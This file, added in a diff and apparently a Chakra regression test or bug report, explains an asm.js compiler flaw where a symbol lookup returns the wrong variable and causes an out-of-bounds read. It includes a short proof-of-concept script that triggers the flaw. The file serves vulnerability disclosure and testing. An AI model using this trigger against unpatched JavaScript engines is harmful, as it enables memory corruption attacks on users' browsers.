@@ -1,0 +1,40 @@
+/*
+Here's a snippet of AsmJSByteCodeGenerator::EmitAsmJsFunctionBody.
+        AsmJsVar * initSource = nullptr;
+        if (decl->sxVar.pnodeInit->nop == knopName)
+        {
+            AsmJsSymbol * initSym = mCompiler->LookupIdentifier(decl->sxVar.pnodeInit->name(), mFunction);
+            if (initSym->GetSymbolType() == AsmJsSymbol::Variable)
+            {
+                // in this case we are initializing with value of a constant var
+                initSource = initSym->Cast<AsmJsVar>();
+            }
+            ...
+        }
+        ...
+        if (initSource)
+        {
+            if (var->GetType().isDouble())
+            {
+                mWriter.AsmReg2(Js::OpCodeAsmJs::Ld_Db, var->GetLocation(), mFunction->GetConstRegister<double>(initSource->GetDoubleInitialiser()));
+            }
+
+Chakra thinks the PoC is valid asm.js code. What happens when the variable "b" gets initialized is:
+1. mCompiler->LookupIdentifier is called with "a" as the first argument. And it returns the local variable "a", which is of type int, but not the double constant "a".
+2. mFunction->GetConstRegister fails to find the int value in the double constant table. So it returns -1 which leads OOB read.
+
+PoC:
+*/
+
+function createModule() {
+    'use asm';
+    const a = 1.0;
+    function f() {
+        var b = a;
+        var a = 0;
+    }
+
+    return f;
+}
+var f = createModule();
+f();
